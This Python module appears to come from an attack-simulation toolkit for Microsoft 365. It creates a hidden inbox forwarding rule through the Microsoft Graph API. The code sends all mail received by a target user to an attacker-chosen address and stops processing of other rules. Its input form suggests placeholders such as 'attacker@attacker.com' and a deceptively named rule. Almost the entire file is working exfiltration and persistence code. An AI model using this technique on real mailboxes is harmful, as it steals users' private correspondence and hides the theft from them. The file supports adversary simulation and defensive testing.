from core.GraphFunctions import graph_post_request

def TechniqueMain(rule_name, user_id, recipient_name, recipient_address):
    '''
    Description: Setup email forwarding on a users mailbox
    Privileges: MailboxSettings.ReadWrite
    Ref: 
    '''
    endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}/mailFolders/inbox/messageRules"

    data = {
        "displayName": rule_name,
        "sequence": 3,
        "isEnabled": "true", 
        "conditions": {
            "sentToMe": "true"
        },
        "actions": {
            "forwardTo": [
                {
                    "emailAddress": {
                        "name": recipient_name,
                        "address": recipient_address
                    }
                }
            ],
            "stopProcessingRules": 'true'
        }
    }

    try:
        forwarding_rule = graph_post_request(url = endpoint_url, data = data)
        return {'success':forwarding_rule}
    except:
        return {'Fail':'Attack Failed'}


def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Rule Name", "id" : "mail-forwarding-config-rule-name-text-input", "type" : "text", "placeholder" : "Seriously-Legitimate-Forwarding-Rule", "element_type" : "dcc.Input"},
        {"title" : "Forwarding Mailbox Address", "id" : "mail-forwarding-config-mailbox-addr-text-input", "type" : "email", "placeholder" : "user@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Recipient Name", "id" : "mail-forwarding-config-forward-addr-name-text-input", "type" : "text", "placeholder" : "APT C00l", "element_type" : "dcc.Input"},
        {"title" : "Recipient Mailbox Address", "id" : "mail-forwarding-config-forward-addr-text-input", "type" : "email", "placeholder" : "attacker@attacker.com", "element_type" : "dcc.Input"},
    ]